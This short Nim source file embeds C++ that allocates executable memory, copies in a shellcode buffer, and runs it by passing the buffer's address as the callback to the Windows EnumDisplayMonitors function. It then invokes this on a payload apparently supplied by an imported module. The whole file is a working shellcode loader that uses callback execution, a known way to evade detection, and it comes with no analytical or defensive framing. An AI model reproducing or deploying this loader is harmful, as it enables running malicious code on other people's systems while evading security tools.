import public

{.emit: """

int EnumDisplayMonitorsNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    ::EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)addr, NULL);
}
"""
.}

proc EnumDisplayMonitorsNim(plainBuffer:cstring,size:cint):cint {.importcpp:"EnumDisplayMonitorsNim(@)",nodecl.}

discard EnumDisplayMonitorsNim(code,codelen)